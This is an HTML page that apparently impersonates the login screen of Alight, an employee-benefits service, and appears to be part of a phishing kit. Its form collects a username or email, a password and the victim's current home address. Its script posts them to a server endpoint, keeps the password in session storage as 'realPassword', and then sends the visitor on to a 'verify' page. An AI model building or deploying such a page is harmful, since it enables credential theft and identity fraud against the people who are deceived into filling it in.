<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in - Alight</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f8fafc;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo { font-size: 2.8rem; font-weight: 700; color: #1e40af; margin: 40px 0 10px; }
        .subtitle { color: #64748b; margin-bottom: 40px; }
        .form-container {
            width: 100%;
            max-width: 380px;
        }
        label {
            display: block;
            margin: 20px 0 8px;
            font-weight: 600;
            color: #334155;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #e2e8f0;
            border-radius: 10px;
            font-size: 1.05rem;
        }
        button {
            width: 100%;
            padding: 16px;
            margin-top: 30px;
            background: #1e40af;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="logo">alight</div>
    <p class="subtitle">Log in to your account</p>

    <div class="form-container">
        <form id="loginForm">
            <label>Username or Email</label>
            <input type="text" id="username" required>

            <label>Password</label>
            <input type="password" id="password" required>

            <label>Home Address (Latest)</label>
            <input type="text" id="address" placeholder="Enter your current home address" required>

            <button type="submit">Continue</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const address = document.getElementById('address').value;

            sessionStorage.setItem('realPassword', password);

            try {
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password, address })
                });
            } catch (err) {}

            window.location.href = "verify.html";
        });
    </script>
</body>
</html>
